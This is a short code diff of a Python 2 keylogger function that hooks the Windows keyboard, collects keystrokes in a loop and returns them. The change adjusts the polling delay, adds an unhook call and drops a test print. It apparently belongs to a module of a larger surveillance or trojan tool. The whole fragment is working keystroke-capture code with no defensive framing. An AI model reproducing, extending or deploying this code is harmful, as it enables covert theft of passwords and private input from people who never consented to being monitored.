@@ -78,11 +78,10 @@ def run(**args):
     kl.KeyDown = KeyStroke
     kl.HookKeyboard()
     while num < 100:
-        time.sleep(0.05)
+        time.sleep(0.02)
         pythoncom.PumpWaitingMessages()
     num = 1
     t = s
     s = ""
+    kl.UnhookKeyboard()
     return t
-	
-print run()
